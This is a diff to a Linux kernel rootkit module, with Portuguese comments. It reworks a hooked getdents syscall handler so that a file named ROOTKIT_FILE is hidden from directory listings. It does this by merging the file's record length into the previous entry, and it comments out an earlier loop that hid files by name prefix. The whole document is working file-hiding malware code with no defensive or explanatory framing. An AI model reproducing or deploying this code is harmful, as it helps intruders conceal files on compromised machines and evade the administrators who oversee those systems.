@@ -101,7 +101,7 @@ asmlinkage int hook_func(const struct pt_regs *regs)
 
     int ret = orig_func(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
-    printk(KERN_INFO "rootkit: memoria alocada com sucesso\n");
+    // printk(KERN_INFO "rootkit: memoria alocada com sucesso; tamanho da entrada: %d\n", ret);
 
     if ( (ret <= 0) || (dirent_ker == NULL) )
         return ret;
@@ -110,15 +110,33 @@ asmlinkage int hook_func(const struct pt_regs *regs)
     error = copy_from_user(dirent_ker, dirent, ret);
     if(error)
         goto done;
+    // current_dir = (void*)dirent_ker + offset;
+    // printk(KERN_INFO "rootkit: item unico atual: %s\n", current_dir->d_name);
 
-    while (offset < ret)
-    {
-        current_dir = (void *)dirent_ker + offset;
+    while (offset < ret) {
+        current_dir = (void*)dirent_ker + offset;
+        // printk(KERN_INFO "rootkit: item: %s\n", current_dir->d_name);
+        if (strcmp(ROOTKIT_FILE, current_dir->d_name) == 0) {
+            printk(KERN_ALERT "rootkit: MATCH FILE\n");
 
-        printk(KERN_INFO "rootkit: diretorio atual: %s\n", current_dir->d_name);
-        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
-        {
-            // printk(KERN_INFO "rootkit: match!\n");
+            previous_dir->d_reclen += current_dir->d_reclen;
+        }
+        else {
+            previous_dir = current_dir;
+        }
+        offset += current_dir->d_reclen;
+    }
+    error = copy_to_user(dirent, dirent_ker, ret);
+    if (error) goto done;
+
+    // while (offset < ret)
+    // {
+    //     current_dir = (void *)dirent_ker + offset;
+    //
+    //     printk(KERN_INFO "rootkit: diretorio atual: %s\n", current_dir->d_name);
+    //     if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
+    //     {
+    //         // printk(KERN_INFO "rootkit: match!\n");
             // /* Check for the special case when we need to hide the first entry */
             // if( current_dir == dirent_ker )
             // {
@@ -131,21 +149,21 @@ asmlinkage int hook_func(const struct pt_regs *regs)
             //  * that of the entry we want to hide - effectively "swallowing" it
             //  */
             // previous_dir->d_reclen += current_dir->d_reclen;
-        }
-        else
-        {
+        // }
+        // else
+        // {
             /* Set previous_dir to current_dir before looping where current_dir
              * gets incremented to the next entry
              */
-            previous_dir = current_dir;
-        }
+    //         previous_dir = current_dir;
+    //     }
+    //
+    //     offset += current_dir->d_reclen;
+    // }
 
-        offset += current_dir->d_reclen;
-    }
-
-    error = copy_to_user(dirent, dirent_ker, ret);
-    if(error)
-        goto done;
+    // error = copy_to_user(dirent, dirent_ker, ret);
+    // if(error)
+    //     goto done;
 
 done:
     kfree(dirent_ker);
